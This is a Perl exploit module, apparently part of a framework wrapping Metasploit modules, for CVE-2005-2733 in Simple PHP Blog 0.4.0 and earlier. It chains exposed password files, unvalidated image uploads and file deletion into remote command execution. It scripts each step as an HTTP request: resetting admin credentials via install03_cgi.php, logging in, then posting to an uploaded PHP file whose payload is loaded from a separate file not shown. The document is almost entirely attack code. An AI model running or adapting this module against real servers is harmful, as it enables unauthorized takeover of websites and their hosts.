package SPHPBLOG::MSF::SphpblogFileUpload;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "SphpblogFileUpload";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2005-2733",
  DESCRIPTION => "

          This module combines three separate issues within The Simple PHP Blog (<= 0.4.0)

        application to upload arbitrary data and thus execute a shell. The first

        vulnerability exposes the hash file (password.txt) to unauthenticated users.

        The second vulnerability lies within the image upload system provided to

        logged-in users; there is no image validation function in the blogger to

        prevent an authenticated user from uploading any file type. The third

        vulnerability occurs within the blog comment functionality, allowing

        arbitrary files to be deleted.

      ",
  MSF_MODULE => "sphpblog_file_upload",
  OSVDB => 19012,
  TITLE => "Simple PHP Blog Remote Command Execution",


  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'install03_cgi.php',
      PAYLOAD      => 'user=yTiyiv&pass=hKCznK',
      TEXT   => 'Sending Exploit #2 Request : [POST] /install03_cgi.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT3 => {
      METHOD       => 'POST',
      PATH   => 'login_cgi.php',
      PAYLOAD      => 'user=yTiyiv&pass=hKCznK',
      TEXT   => 'Sending Exploit #3 Request : [POST] /login_cgi.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT4 => {
      METHOD       => 'POST',
      PATH   => 'images/jGaRx6I187zE0VVs77Kb.php',
      PAYLOAD      => read_file('MSFExploits/SPHPBLOG/MSF/src/SphpblogFileUpload.payload', 1),
      TEXT   => 'Sending Exploit #4 Request : [POST] /images/jGaRx6I187zE0VVs77Kb.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
